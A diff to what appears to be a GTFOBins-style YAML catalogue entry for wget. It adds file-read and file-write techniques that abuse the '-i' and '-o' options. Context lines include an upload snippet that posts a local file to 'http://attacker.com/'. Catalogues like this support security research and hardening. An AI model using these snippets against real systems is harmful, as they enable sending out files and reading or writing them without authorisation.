@@ -6,6 +6,18 @@ functions:
         URL=http://attacker.com/
         LFILE=file_to_send
         wget --post-file=$LFILE $URL
+  file-read:
+    - description: The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.
+      code: |
+        LFILE=file_to_read
+        wget -i $LFILE
+  file-write:
+    - description: The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.
+      code: |
+        LFILE=file_to_write
+        TF=$(mktemp)
+        echo DATA > $TF
+        wget -i $TF -o $LFILE
   file-download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
